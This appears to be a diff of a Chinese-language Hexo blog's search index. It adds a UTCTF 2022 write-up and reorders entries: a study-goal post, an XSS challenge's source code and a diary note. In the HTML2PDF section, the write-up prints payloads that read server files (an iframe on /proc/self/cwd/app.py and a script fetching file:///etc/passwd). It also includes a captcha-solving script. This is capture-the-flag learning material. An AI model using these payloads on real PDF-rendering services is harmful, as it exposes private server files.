@@ -24,31 +24,65 @@
       </tags>
   </entry>
   <entry>
-    <title>立个flag -- about sec</title>
-    <url>/2022/03/11/flag-sec/</url>
-    <content><![CDATA[<h1 id="立个flag-–-about-sec"><a href="#立个flag-–-about-sec" class="headerlink" title="立个flag – about sec"></a>立个flag – about sec</h1><p>浏览Twitter的时候看到了 s1ru1us 的blog</p>
-<p><a href="https://blog.s1r1us.ninja/home">https://blog.s1r1us.ninja/home</a></p>
-<p>看了他关于新的一年的总结 十分有感触</p>
-<p>他是一个非常有任性的安全工程师 和他比起来 我所接受的教育无疑是更幸运的的 但他通过自己的努力走出了一条道路 并最后成功</p>
-<p>看了他的研究路线很受启发  因为最近在搞AI方面东西 在CTF上花的时间就更少了</p>
-<p>我决定专精一方面来弥补 – 所以把研究方向选为 <strong>浏览器安全</strong></p>
-<p>我决定在这学期内采纳一些他的学习路线</p>
-<ul>
-<li>solve every xss challenge on  <a href="https://twitter.com/terjanq">terjang</a>‘s twitter</li>
-<li>read every blog <a href="https://blog.s1r1us.ninja/inspiration">https://blog.s1r1us.ninja/inspiration</a></li>
-</ul>
-<p>这将是一个不小的挑战 在研究AI和维持绩点之余</p>
-<p>希望可以走的更远</p>
-<p>最后一个flag</p>
-<ul>
-<li>be the full member of r3kapig</li>
-</ul>
+    <title>UTCTF2022</title>
+    <url>/2022/03/14/UTCTF/</url>
+    <content><![CDATA[<h1 id="UTCTF"><a href="#UTCTF" class="headerlink" title="UTCTF"></a>UTCTF</h1><p>我承认我这周摸鱼了 因为俄罗斯的游戏免费 2333  周一复现一下</p>
+<p><img src="/UTCTF.assets/image-20220314110537531.png" alt="image-20220314110537531"></p>
+<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Websockets"><a href="#Websockets" class="headerlink" title="Websockets"></a>Websockets</h3><p>看一下这个什么意思</p>
+<blockquote>
+<p>Can you hack my website?</p>
+<p>By Daniel Parks (@danielp on discord)</p>
+<p><a href="http://web1.utctf.live:8651/">http://web1.utctf.live:8651</a></p>
+</blockquote>
+<p>别的师傅做的</p>
+<p>看一下包</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/internal/ws</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>web1.utctf.live:8651</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Upgrade</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36</span><br><span class="line"><span class="attribute">Upgrade</span><span class="punctuation">: </span>websocket</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://web1.utctf.live:8651</span><br><span class="line"><span class="attribute">Sec-WebSocket-Version</span><span class="punctuation">: </span>13</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Sec-WebSocket-Key</span><span class="punctuation">: </span>Mn6BDybVn/BJ5iCDpZ9JSw==</span><br></pre></td></tr></table></figure>
+
+<p>建立socket连接后 爆破</p>
+<h3 id="HTML2PDF"><a href="#HTML2PDF" class="headerlink" title="HTML2PDF"></a>HTML2PDF</h3><blockquote>
+<p>My friend bet me I couldn’t pwn this site. Can you help me break in?</p>
+<p><em>by mattyp</em></p>
+<p><a href="http://web2.utctf.live:9854/">http://web2.utctf.live:9854</a></p>
+</blockquote>
+<p><img src="%5CUTCTF.assets%5Cimage-20220314104424213.png" alt="image-20220314104424213"></p>
+<p>打开网站是个这样的页面 点submit后 会直接convert to pdf</p>
+<p>可以用 iframe 直接读文件</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>Try Me!<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;/proc/self/cwd/app.py&quot;</span> <span class="attr">height</span>=<span class="string">&quot;1600px&quot;</span> <span class="attr">width</span>=<span class="string">&quot;800px&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><a href="https://zone.huoxian.cn/d/550-pdfhtmlxss-ssrf">https://zone.huoxian.cn/d/550-pdfhtmlxss-ssrf</a></p>
+<p>直接拿里面的payload打 就ok</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">x=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>;x.<span class="property">onload</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="variable language_">this</span>.<span class="property">responseText</span>)&#125;;x.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;file:///etc/passwd&quot;</span>);x.<span class="title function_">send</span>();</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="ReReCaptcha"><a href="#ReReCaptcha" class="headerlink" title="ReReCaptcha"></a>ReReCaptcha</h3><blockquote>
+<p>Just solve 1000 captchas. It’s super easy. By ggu (@ggu on discord)</p>
+<p><a href="http://web1.utctf.live:7132/">http://web1.utctf.live:7132</a></p>
+</blockquote>
+<p>直接按像素提取 不是很出色</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = requests.get(<span class="string">&#x27;http://web1.utctf.live:7132/&#x27;</span>)</span><br><span class="line"><span class="comment"># print(res.text)</span></span><br><span class="line">soup = BeautifulSoup(res.text,<span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">img_data = soup.find(<span class="string">&#x27;img&#x27;</span>).get(<span class="string">&#x27;src&#x27;</span>).split(<span class="string">&quot;,&quot;</span>)[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">binary_img_data = base64.b64decode(img_data)</span><br><span class="line">file_like = BytesIO(binary_img_data)</span><br><span class="line">image = Image.<span class="built_in">open</span>(file_like)</span><br><span class="line"><span class="comment"># print(image.size)</span></span><br><span class="line"><span class="comment">#尝试者把中间那块直接分割出来</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Clipper</span>(<span class="params">image</span>):</span><br><span class="line">    img = image</span><br><span class="line">    width, height = img.size</span><br><span class="line">    <span class="comment"># print(width,height)</span></span><br><span class="line">    box = (<span class="number">15</span>,<span class="number">10</span>,<span class="number">410</span>, <span class="number">110</span>)</span><br><span class="line">    <span class="comment"># 前两个坐标点是左上角坐标</span></span><br><span class="line">    <span class="comment"># 后两个坐标点是右下角坐标</span></span><br><span class="line">    <span class="comment"># width在前， height在后</span></span><br><span class="line">    region = img.crop(box)</span><br><span class="line">    <span class="comment"># region.show()</span></span><br><span class="line">    <span class="keyword">return</span> region</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">region = Clipper(image)</span><br><span class="line">region.save(<span class="string">&quot;./abab.png&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#接下来提取所有的黄（部分绿）像素点</span></span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">imagepath = <span class="string">r&#x27;./abab.png&#x27;</span></span><br><span class="line">image = cv2.imread(imagepath)</span><br><span class="line">height, width, channel = image.shape</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">        b, g, r = image[i, j]</span><br><span class="line">        <span class="keyword">if</span> ((r - b) &gt; <span class="number">210</span> <span class="keyword">and</span> (g - b) &gt; <span class="number">80</span>):  <span class="comment">#这里需要继续调一下</span></span><br><span class="line">            b = <span class="number">0</span></span><br><span class="line">            g = <span class="number">0</span></span><br><span class="line">            r = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            b = <span class="number">255</span></span><br><span class="line">            g = <span class="number">255</span></span><br><span class="line">            r = <span class="number">255</span></span><br><span class="line"></span><br><span class="line">        image[i, j] = [r, g, b]</span><br><span class="line">plt.figure(figsize=(<span class="number">20</span>, <span class="number">10</span>))</span><br><span class="line">plt.imshow(image)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
+
+<p>二值化</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 图片二值化</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"></span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&#x27;./abab.png&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 模式L”为灰色图像，它的每个像素用8个bit表示，0表示黑，255表示白，其他数字表示不同的灰度。</span></span><br><span class="line">Img = img.convert(<span class="string">&#x27;L&#x27;</span>)</span><br><span class="line">Img.save(<span class="string">&quot;./ab.png&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 自定义灰度界限，大于这个值为黑色，小于这个值为白色</span></span><br><span class="line">threshold = <span class="number">123</span></span><br><span class="line"></span><br><span class="line">table = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">if</span> i &lt; threshold:</span><br><span class="line">        table.append(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        table.append(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 图片二值化</span></span><br><span class="line">photo = Img.point(table, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">photo.save(<span class="string">&quot;./ababab.png&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">photo.show()</span><br></pre></td></tr></table></figure>
+
+<p>一般</p>
+<p>我想:</p>
+<p>他这个像素值只有固定几种 不知道能不能找出加密算法 emmm</p>
+<p>然后去摸鱼了 emmm</p>
+<h3 id="Sigma"><a href="#Sigma" class="headerlink" title="Sigma"></a>Sigma</h3><blockquote>
+<p>Our new image processing tool runs completely in your browser! Right now we only support one image effect and image format though.</p>
+<p>Note: this challenge is also a reversing challenge.</p>
+<p>By ggu (@ggu on discord)</p>
+<p><a href="http://web2.utctf.live:5006/">http://web2.utctf.live:5006</a></p>
+<p><a href="https://utctf.live/files/2382cf3e8bce7c5ae20c7900e44888b5/server.zip?token=eyJ1c2VyX2lkIjo2NCwidGVhbV9pZCI6MzcsImZpbGVfaWQiOjEyfQ.YixQuA.zo685DLvS_VDoKICLHwN_4RyhQo"> server.zip</a></p>
+</blockquote>
+<p>猫哥yyds</p>
 ]]></content>
       <categories>
-        <category>plan</category>
+        <category>CTF</category>
       </categories>
       <tags>
-        <tag>goal</tag>
+        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -79,6 +113,60 @@
 <li>明天有UTCTF 看看web题目</li>
 <li>论文读起来很吃力 要想办法解决</li>
 </ul>
+]]></content>
+      <categories>
+        <category>learn365</category>
+      </categories>
+      <tags>
+        <tag>learn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>立个flag -- about sec</title>
+    <url>/2022/03/11/flag-sec/</url>
+    <content><![CDATA[<h1 id="立个flag-–-about-sec"><a href="#立个flag-–-about-sec" class="headerlink" title="立个flag – about sec"></a>立个flag – about sec</h1><p>浏览Twitter的时候看到了 s1ru1us 的blog</p>
+<p><a href="https://blog.s1r1us.ninja/home">https://blog.s1r1us.ninja/home</a></p>
+<p>看了他关于新的一年的总结 十分有感触</p>
+<p>他是一个非常有任性的安全工程师 和他比起来 我所接受的教育无疑是更幸运的的 但他通过自己的努力走出了一条道路 并最后成功</p>
+<p>看了他的研究路线很受启发  因为最近在搞AI方面东西 在CTF上花的时间就更少了</p>
+<p>我决定专精一方面来弥补 – 所以把研究方向选为 <strong>浏览器安全</strong></p>
+<p>我决定在这学期内采纳一些他的学习路线</p>
+<ul>
+<li>solve every xss challenge on  <a href="https://twitter.com/terjanq">terjang</a>‘s twitter</li>
+<li>read every blog <a href="https://blog.s1r1us.ninja/inspiration">https://blog.s1r1us.ninja/inspiration</a></li>
+</ul>
+<p>这将是一个不小的挑战 在研究AI和维持绩点之余</p>
+<p>希望可以走的更远</p>
+<p>最后一个flag</p>
+<ul>
+<li>be the full member of r3kapig</li>
+</ul>
+]]></content>
+      <categories>
+        <category>plan</category>
+      </categories>
+      <tags>
+        <tag>goal</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>one-xss-challenge</title>
+    <url>/2022/03/11/one-xss-challenge/</url>
+    <content><![CDATA[<h1 id="一个xss挑战"><a href="#一个xss挑战" class="headerlink" title="一个xss挑战"></a>一个xss挑战</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> unsafeCharacters = [<span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;`&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;&#123;&quot;</span>, <span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;(&quot;</span>, <span class="string">&quot;)&quot;</span>, <span class="string">&quot;[&quot;</span>, <span class="string">&quot;]&quot;</span>, <span class="string">&quot;=&quot;</span>, <span class="string">&quot;,&quot;</span>, <span class="string">&quot;+&quot;</span>];</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sanitize</span>(<span class="params">str</span>) &#123;</span><br><span class="line">	str += <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">let</span> char <span class="keyword">of</span> unsafeCharacters) &#123;</span><br><span class="line">		str = str.<span class="title function_">replaceAll</span>(char, <span class="string">`&amp;#x<span class="subst">$&#123;char.codePointAt().toString(<span class="number">0x10</span>)&#125;</span>;`</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">showMessage</span>(<span class="params">title = <span class="string">&quot;&quot;</span>, message = <span class="string">&quot;&quot;</span>, button = &#123; text: <span class="string">&quot;Close&quot;</span>, action: <span class="string">&quot;this.parentElement.parentElement.parentElement.remove();&quot;</span>, &#125;</span>) &#123;</span><br><span class="line">	<span class="keyword">let</span> elem = (<span class="keyword">new</span> <span class="title class_">Range</span>).<span class="title function_">createContextualFragment</span>(<span class="string">`</span></span><br><span class="line"><span class="string">		&lt;div class=&quot;alert&quot;&gt;</span></span><br><span class="line"><span class="string">			&lt;div class=&quot;alert-inner&quot;&gt;</span></span><br><span class="line"><span class="string">				&lt;div class=&quot;page-bar&quot;&gt;</span></span><br><span class="line"><span class="string">					&lt;h3&gt;<span class="subst">$&#123;sanitize(title)&#125;</span>&lt;/h3&gt;</span></span><br><span class="line"><span class="string">					&lt;button onclick=&quot;<span class="subst">$&#123;sanitize(button.action)&#125;</span>&quot;&gt;<span class="subst">$&#123;sanitize(button.text)&#125;</span>&lt;/button&gt;</span></span><br><span class="line"><span class="string">				&lt;/div&gt;</span></span><br><span class="line"><span class="string">				&lt;div class=&quot;page-content&quot;&gt;</span></span><br><span class="line"><span class="string">					<span class="subst">$&#123;sanitize(message)&#125;</span></span></span><br><span class="line"><span class="string">				&lt;/div&gt;</span></span><br><span class="line"><span class="string">			&lt;/div&gt;</span></span><br><span class="line"><span class="string">		&lt;/div&gt;</span></span><br><span class="line"><span class="string">	`</span>);</span><br><span class="line">	<span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">append</span>(elem);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> inputFields = &#123;</span><br><span class="line">	<span class="attr">passwordLength</span>: <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;password-length&quot;</span>),</span><br><span class="line">	<span class="attr">allowNumbers</span>: <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;allow-numbers&quot;</span>),</span><br><span class="line">	<span class="attr">allowSymbols</span>: <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;allow-symbols&quot;</span>),</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> generating = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">generate</span>(<span class="params"></span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> (generating) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="title function_">requestAnimationFrame</span>(<span class="function"><span class="params">_</span> =&gt;</span> (generating = <span class="literal">false</span>));</span><br><span class="line">	generating = <span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">let</span> passwordLength = inputFields.<span class="property">passwordLength</span>.<span class="property">value</span>;</span><br><span class="line">	<span class="keyword">let</span> json = <span class="string">`&#123; &quot;passwordLength&quot;: <span class="subst">$&#123;passwordLength&#125;</span>, &quot;seed&quot;: <span class="subst">$&#123;crypto.getRandomValues(<span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="number">1</span>))[<span class="number">0</span>]&#125;</span>, &quot;allowNumbers&quot;: <span class="subst">$&#123;inputFields.allowNumbers.checked&#125;</span>, &quot;allowSymbols&quot;: <span class="subst">$&#123;inputFields.allowSymbols.checked&#125;</span> &#125;`</span>;</span><br><span class="line">	<span class="keyword">if</span> (!(passwordLength = passwordLength.<span class="title function_">match</span>(<span class="regexp">/^\d+$/gm</span>))) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_">showMessage</span>(<span class="string">&quot;Error&quot;</span>, <span class="string">&quot;Password Length must be a number.&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	passwordLength = <span class="title class_">Number</span>(passwordLength[<span class="number">0</span>]);</span><br><span class="line">	<span class="keyword">let</span> wasm = <span class="keyword">await</span> <span class="title class_">WebAssembly</span>.<span class="title function_">instantiateStreaming</span>(<span class="title function_">fetch</span>(<span class="string">&quot;program.wasm&quot;</span>), &#123; <span class="attr">env</span>: &#123; <span class="attr">log_str</span>: <span class="function"><span class="params">idx</span> =&gt;</span> &#123;</span><br><span class="line">		<span class="keyword">let</span> str = <span class="string">&quot;&quot;</span>;</span><br><span class="line">		<span class="keyword">while</span> (u8[idx] != <span class="number">0</span>) &#123;</span><br><span class="line">			str += <span class="title class_">String</span>.<span class="title function_">fromCodePoint</span>(u8[idx]);</span><br><span class="line">			++idx;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable language_">console</span>.<span class="title function_">log</span>(str);</span><br><span class="line">	&#125;, <span class="attr">log_int</span>: <span class="variable language_">console</span>.<span class="property">log</span>, &#125;&#125;);</span><br><span class="line">	<span class="keyword">let</span> u8 = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(wasm.<span class="property">instance</span>.<span class="property">exports</span>.<span class="property">memory</span>.<span class="property">buffer</span>);</span><br><span class="line">	<span class="keyword">let</span> options = wasm.<span class="property">instance</span>.<span class="property">exports</span>.<span class="title function_">malloc</span>(json.<span class="property">length</span> + <span class="number">1</span>);</span><br><span class="line">	<span class="keyword">let</span> password = wasm.<span class="property">instance</span>.<span class="property">exports</span>.<span class="title function_">malloc</span>(<span class="title class_">Number</span>(passwordLength) + <span class="number">1</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">let</span> idx = <span class="number">0</span>; idx &lt; json.<span class="property">length</span>; ++idx) &#123;</span><br><span class="line">		u8[options + idx] = json.<span class="title function_">codePointAt</span>(idx) % <span class="number">0xff</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	u8[options + json.<span class="property">length</span>] = <span class="number">0</span>;</span><br><span class="line">	wasm.<span class="property">instance</span>.<span class="property">exports</span>.<span class="title function_">generate_password</span>(options, password);</span><br><span class="line">	<span class="keyword">let</span> output_password = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">let</span> idx = <span class="number">0</span>; idx &lt; passwordLength; ++idx) &#123;</span><br><span class="line">		output_password += <span class="title class_">String</span>.<span class="title function_">fromCodePoint</span>(u8[password + idx]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="title function_">showMessage</span>(<span class="string">&quot;Password Generated&quot;</span>, <span class="string">&quot;Your password is: &quot;</span> + output_password, &#123; <span class="attr">text</span>: <span class="string">&quot;OK&quot;</span>, <span class="attr">action</span>: <span class="string">&quot;generateAnother();&quot;</span>, &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">generateAnother</span>(<span class="params"></span>) &#123;</span><br><span class="line">	<span class="keyword">let</span> params = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>;</span><br><span class="line">	params.<span class="title function_">set</span>(<span class="string">&quot;passwordLength&quot;</span>, inputFields.<span class="property">passwordLength</span>.<span class="property">value</span>);</span><br><span class="line">	params.<span class="title function_">set</span>(<span class="string">&quot;allowNumbers&quot;</span>, inputFields.<span class="property">allowNumbers</span>.<span class="property">checked</span>);</span><br><span class="line">	params.<span class="title function_">set</span>(<span class="string">&quot;allowSymbols&quot;</span>, inputFields.<span class="property">allowSymbols</span>.<span class="property">checked</span>);</span><br><span class="line">	params.<span class="title function_">set</span>(<span class="string">&quot;timestamp&quot;</span>, <span class="title class_">Number</span>(<span class="keyword">new</span> <span class="title class_">Date</span>));</span><br><span class="line">	location.<span class="property">search</span> = params;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> settings = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(location.<span class="property">search</span>);</span><br><span class="line">inputFields.<span class="property">passwordLength</span>.<span class="property">value</span> = settings.<span class="title function_">get</span>(<span class="string">&quot;passwordLength&quot;</span>) ?? <span class="number">8</span>;</span><br><span class="line">inputFields.<span class="property">allowNumbers</span>.<span class="property">checked</span> = settings.<span class="title function_">get</span>(<span class="string">&quot;allowNumbers&quot;</span>) !== <span class="string">&quot;false&quot;</span>;</span><br><span class="line">inputFields.<span class="property">allowSymbols</span>.<span class="property">checked</span> = settings.<span class="title function_">get</span>(<span class="string">&quot;allowSymbols&quot;</span>) !== <span class="string">&quot;false&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>xss</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>learn2&amp;3</title>
+    <url>/2022/03/14/learn2-3/</url>
+    <content><![CDATA[<h1 id="learn2-amp-3"><a href="#learn2-amp-3" class="headerlink" title="learn2&amp;3"></a>learn2&amp;3</h1><p>周末没干啥大事 新到了手柄沉迷了一下 (鬼泣5真香)  看了看UTCTF的web</p>
+<p>摸鱼 0.0</p>
 ]]></content>
       <categories>
         <category>learn365</category>
